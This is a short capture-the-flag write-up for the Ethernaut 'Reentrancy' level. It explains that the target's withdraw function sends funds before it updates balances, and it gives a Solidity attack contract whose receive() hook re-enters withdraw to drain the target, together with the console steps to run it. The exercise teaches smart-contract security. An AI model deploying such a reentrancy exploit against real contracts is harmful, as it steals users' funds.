[10 - Reentrancy](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

Solution: 
* await getBalance(contract.address); // shows 0.001 ETH to be stolen
* **withdraw** function first transfers funds, and only after decrements balances
* I need a SC that calls withdraw, and is reentrant to call again, until target's balance is 0
* first deploy ReentranceSolution, and do Reentrance.donate(ReentranceSolution.address, 0.001 ETH);
* call ReentranceSolution.solve();
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
  function withdraw(uint _amount) external;
}

contract ReentranceSolution {
  bool private reenter = true;
  Reentrance private constant reentranceContract = Reentrance(0xE6D924caF74fbCC2dB1F2c9b73481f9D44F82452);

  receive() external payable {
    if (reenter) {
      reenter = false;
      reentranceContract.withdraw(1 ether / 1000);
    }
  }

  function solve() external {
    reentranceContract.withdraw(1 ether / 1000);
  }
}
```
* await contract.donate("0x232e3417e1be77246AFC48737FAB72d01254624B", {value: 1000000000000000});
* on Remix, ReentranceSolution.solve();